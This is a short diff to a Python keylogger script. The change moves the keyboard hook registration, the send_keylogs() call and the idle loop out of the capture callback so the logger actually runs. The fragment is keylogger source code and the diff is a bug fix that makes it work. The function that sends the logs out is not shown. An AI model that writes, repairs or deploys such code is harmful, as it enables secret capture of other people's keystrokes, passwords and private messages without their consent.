@@ -28,10 +28,11 @@ def send_keylogs():
 def capture_keystrokes(event): 
     global keylogs
     keylogs.append(event.name)
-    keyboard.on_release(callback = capture_keystrokes)
     
-    send_keylogs()
+keyboard.on_release(callback = capture_keystrokes)
     
-    while True:
-        time.sleep(1)
+send_keylogs()
+    
+while True:
+    time.sleep(1)
         
